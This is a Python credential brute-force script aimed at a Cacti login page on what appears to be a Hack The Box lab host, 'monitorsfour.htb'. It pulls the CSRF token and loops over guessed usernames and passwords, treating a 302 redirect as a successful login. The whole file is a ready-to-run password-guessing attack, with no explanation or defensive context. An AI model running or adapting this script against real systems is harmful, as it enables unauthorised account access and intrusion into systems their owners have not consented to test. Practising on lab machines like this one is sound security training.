import requests
import re
import sys

url = "http://cacti.monitorsfour.htb/cacti/index.php"
users = [
    "admin", 
    "guest", 
    "nicola", "njohnson", "nicola.johnson", "n.johnson", "johnson.n",
    "glenn", "gjones", "glenn.jones", "g.jones", "jones.g"
]
passwords = [
    "admin", 
    "password", 
    "monitorsfour", "MonitorsFour", "MonitorsFour!", "MonitorsFour123",
    "MonitorsFour2025", "MonitorsFour2024", "MonitorsFour!",
    "welcome", "welcome1", "Welcome1!",
    "nicola", "glenn"
]
def get_csrf_token(session):
    r = session.get(url)
    token_search = re.search(r'name=\'__csrf_magic\' value="(.*?)"', r.text)
    if token_search:
        return token_search.group(1)
    return None

print(f"[*] Starting attack against {url}...")

for user in users:
    for password in passwords:
        try:
            s = requests.Session()
            
            csrf_token = get_csrf_token(s)
            if not csrf_token:
                print("[-] Could not retrieve CSRF token. Exiting.")
                sys.exit()

            data = {
                '__csrf_magic': csrf_token,
                'action': 'login',
                'login_username': user,
                'login_password': password
            }

            r = s.post(url, data=data, allow_redirects=False)

            if r.status_code == 302 and "Location" in r.headers:
                print(f"\n[+] SUCCESS! Found credentials: {user}:{password}")
                print(f"[+] Redirects to: {r.headers['Location']}")
                sys.exit()
            else:
                print(f"[-] Failed: {user}:{password}")
        
        except Exception as e:
            print(f"[!] Error: {e}")

print("\n[*] Attack finished.")